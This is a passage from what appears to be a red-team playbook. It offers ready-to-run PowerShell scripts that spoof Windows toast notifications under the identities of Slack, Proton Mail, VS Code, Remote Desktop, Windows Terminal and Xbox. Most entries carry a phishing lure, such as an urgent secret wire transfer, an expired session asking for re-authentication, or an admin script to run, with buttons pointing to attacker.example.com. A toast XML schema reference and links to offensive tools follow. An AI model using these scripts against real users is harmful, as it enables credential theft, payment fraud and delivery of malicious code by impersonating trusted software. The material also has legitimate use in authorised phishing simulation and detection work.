      <text>I need you to process an urgent wire transfer of $45,000. I'll explain later. Don't mention it to anyone.</text>
      <text placement="attribution">Slack</text>
    </binding>
  </visual>
  <actions>
    <action content="Reply in Slack"
            activationType="protocol"
            arguments="https://attacker.example.com/slack-dm"/>
    <action content="Dismiss"
            activationType="system"
            arguments="dismiss"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 20 Slack: #security-alerts Channel IOC
 
**AUMID:** `com.squirrel.slack.slack` · **Category:** SOC Phishing
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "com.squirrel.slack.slack"
 
$xml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>#security-alerts · New IOC Confirmed</text>
      <text>Malicious hash detected on 3 endpoints. Review the updated playbook and apply mitigations immediately.</text>
    </binding>
  </visual>
  <actions>
    <action content="View playbook"
            activationType="protocol"
            arguments="https://attacker.example.com/playbook-ioc"/>
    <action content="Open in Slack"
            activationType="protocol"
            arguments="https://attacker.example.com/slack-channel"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 21 Proton Mail: Encrypted Message Received
 
**AUMID:** `com.squirrel.proton_mail.ProtonMail` · **Category:** Credential Phishing
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "com.squirrel.proton_mail.ProtonMail"
 
$xml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Proton Mail — Encrypted Urgent Message</text>
      <text>You have an encrypted message from your attorney. Your session expired — re-authenticate to read it.</text>
      <text placement="attribution">Proton Mail</text>
    </binding>
  </visual>
  <actions>
    <action content="Decrypt message"
            activationType="protocol"
            arguments="https://attacker.example.com/proton-auth"/>
    <action content="Dismiss"
            activationType="system"
            arguments="dismiss"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 22 VS Code: Compromised Extension Detected
 
**AUMID:** `Microsoft.VisualStudioCode` · **Category:** Developer Targeting
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "Microsoft.VisualStudioCode"
 
$xml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>VS Code — Compromised Extension Detected</text>
      <text>The installed "Python (ms-python)" extension contains malicious code. Remove it and scan your system now.</text>
    </binding>
  </visual>
  <actions>
    <action content="Scan now"
            activationType="protocol"
            arguments="https://attacker.example.com/vscode-scan"/>
    <action content="View extensions"
            activationType="protocol"
            arguments="https://attacker.example.com/extensions"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 23 Remote Desktop: Unauthorized RDP Session
 
**AUMID:** `Microsoft.Windows.RemoteDesktop` · **Category:** Lateral Movement
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "Microsoft.Windows.RemoteDesktop"
 
$xml = @"
<toast scenario="urgent">
  <visual>
    <binding template="ToastGeneric">
      <text>Remote Desktop — Unauthorized Session Detected</text>
      <text>An active RDP session was detected from 185.220.101.45 (Russia). Terminate it immediately.</text>
    </binding>
  </visual>
  <actions>
    <action content="Terminate session now"
            activationType="protocol"
            arguments="https://attacker.example.com/rdp-terminate"/>
    <action content="View details"
            activationType="protocol"
            arguments="https://attacker.example.com/rdp-details"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 24 Windows Terminal: Admin Script Execution Lure
 
**AUMID:** `Microsoft.WindowsTerminal_8wekyb3d8bbwe!App` · **Category:** Privilege Escalation Lure
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "Microsoft.WindowsTerminal_8wekyb3d8bbwe!App"
 
$xml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Windows Terminal — Maintenance Task</text>
      <text>IT has scheduled a cache cleanup task. Please run the attached script with administrator privileges.</text>
    </binding>
  </visual>
  <actions>
    <action content="Run script"
            activationType="protocol"
            arguments="https://attacker.example.com/cleanup.ps1"/>
    <action content="Postpone"
            activationType="system"
            arguments="snooze"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```
 
### 25 Xbox / Gaming: Microsoft Points Gift
 
**AUMID:** `Microsoft.GamingApp_8wekyb3d8bbwe!Microsoft.Xbox.App` · **Category:** Social Engineering
 
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
 
$AUMID = "Microsoft.GamingApp_8wekyb3d8bbwe!Microsoft.Xbox.App"
 
$xml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Xbox — You received 5,000 Microsoft Points!</text>
      <text>A friend sent you a gift. Claim it before it expires (24h). Sign in to view it.</text>
    </binding>
  </visual>
  <actions>
    <action content="Claim gift"
            activationType="protocol"
            arguments="https://attacker.example.com/xbox-gift"/>
    <action content="Dismiss"
            activationType="system"
            arguments="dismiss"/>
  </actions>
</toast>
"@
 
$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```


## 🔍 Toast XML Schema Reference

### Basic notification
```xml
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Title</text>
      <text>Body text</text>
      <text placement="attribution">App name</text>
    </binding>
  </visual>
</toast>
```

### With action button
```xml
<toast>
  <visual>...</visual>
  <actions>
    <action content="Button label"
            activationType="protocol"
            arguments="https://url.example.com"/>
    <action content="Dismiss"
            activationType="system"
            arguments="dismiss"/>
  </actions>
</toast>
```

### Incoming call (Teams-style)
```xml
<toast scenario="incomingCall">
  <visual>
    <binding template="ToastGeneric">
      <text>Caller Name</text>
      <text hint-style="subtitle">Incoming call</text>
      <image placement="appLogoOverride" hint-crop="circle"
             src="C:\Users\Public\Pictures\photo.jpg"/>
    </binding>
  </visual>
  <actions>
    <input id="msg" type="text" placeHolderContent="Send a message..."/>
    <action content="Answer"
            activationType="protocol"
            arguments="https://url.example.com"
            hint-inputId="msg"/>
    <action content="Decline"
            activationType="system"
            arguments="dismiss"/>
  </actions>
</toast>
```

### With selection input
```xml
<toast>
  <visual>...</visual>
  <actions>
    <input id="sel" type="selection" defaultInput="opt1" title="Choose:">
      <selection id="opt1" content="Option 1"/>
      <selection id="opt2" content="Option 2"/>
    </input>
    <action content="Confirm"
            activationType="protocol"
            arguments="https://url.example.com"/>
  </actions>
</toast>
```

### `scenario` attribute values

| Value | Behavior |
|---|---|
| `default` | Standard notification |
| `reminder` | Reminder styling — stays visible longer |
| `alarm` | Alarm behavior |
| `incomingCall` | Full-screen call UI with answer/decline buttons |
| `urgent` | Breaks through focus assist / Do Not Disturb |


## 🔗 References & Related Tools

| Resource | Link |
|---|---|
| ipurple.team — Toast Notifications playbook | https://ipurple.team/2026/03/25/toast-notifications/ |
| ToastNotify — C# assembly (in-memory execution) | https://github.com/netbiosX/ToastNotify |
| toastnotify-bof — Beacon Object File | https://github.com/brmkit/toastnotify-bof |
| Invoke-CredentialPhisher (Fox-IT) | https://github.com/fox-it/Invoke-CredentialPhisher |
| Microsoft Toast Notifications docs | https://learn.microsoft.com/en-us/windows/apps/design/shell/tiles-and-notifications/toast-notifications-overview |
| MITRE ATT&CK T1204.001 | https://attack.mitre.org/techniques/T1204/001/ |
